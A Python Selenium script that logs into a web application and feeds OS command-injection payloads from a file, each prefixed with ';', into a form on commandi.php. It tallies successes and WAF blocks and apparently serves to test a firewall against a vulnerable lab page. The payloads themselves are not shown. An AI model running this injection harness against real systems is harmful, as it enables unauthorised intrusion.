from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
import time

PATH = """C:\Program Files (x86)\chromedriver.exe"""


def init():
    print("[+] Initializing")
    driver = webdriver.Chrome(PATH)

    # Import data about the target (url, username, password)
    with open("secret.txt") as file:
        target_url, username, password = file.read().splitlines()

    # Login to website
    driver.get(target_url)
    element = driver.find_element_by_id("login")
    element.clear()
    element.send_keys(username)
    element = driver.find_element_by_id("password")
    element.clear()
    element.send_keys(password, Keys.RETURN)
    return driver, target_url

#def execute(driver, target_url):
def execute():
    driver, target_url = init()  # to delete

    # Start to attack
    implement_attack(driver, target_url)

    driver.quit()


def implement_attack(driver, target_url):
    attack_url_page = "commandi.php"  # OS Command Injection
    success_counter = 0
    blocked_by_waf_counter = 0
    length_of_payload_file = 0

    with open("Payloads/OS_Injection.txt", 'r', encoding='latin-1') as payload_list:
        for payload in payload_list.read().splitlines():
            length_of_payload_file += 1
            try:
                # Load page
                driver.get(target_url + attack_url_page)
                # Send payload
                driver.find_element_by_id("target").clear()
                driver.find_element_by_id("target").send_keys(";"+payload, Keys.RETURN)
                # Look for success
                att = driver.find_element_by_xpath("//div[@id='main']/p[@align='left']").text

                if att != "":
                    if "Server: 127.0.0.53" not in att:
                        #print("\nAttack Passed:", payload)
                        #print(att)
                        success_counter += 1

            except NoSuchElementException:
                waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
                if "403 Forbidden" == waf_block_message:
                    print("\nAttack Blocked:", payload)
                    blocked_by_waf_counter +=1

        print(f"[+] ~~OS Injection Results~~ [+]")
        print(f"[+] Total Successful Attacks:", success_counter)
        print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
        print(f"[+] Total Failed Attacks:", length_of_payload_file - blocked_by_waf_counter - success_counter)

execute()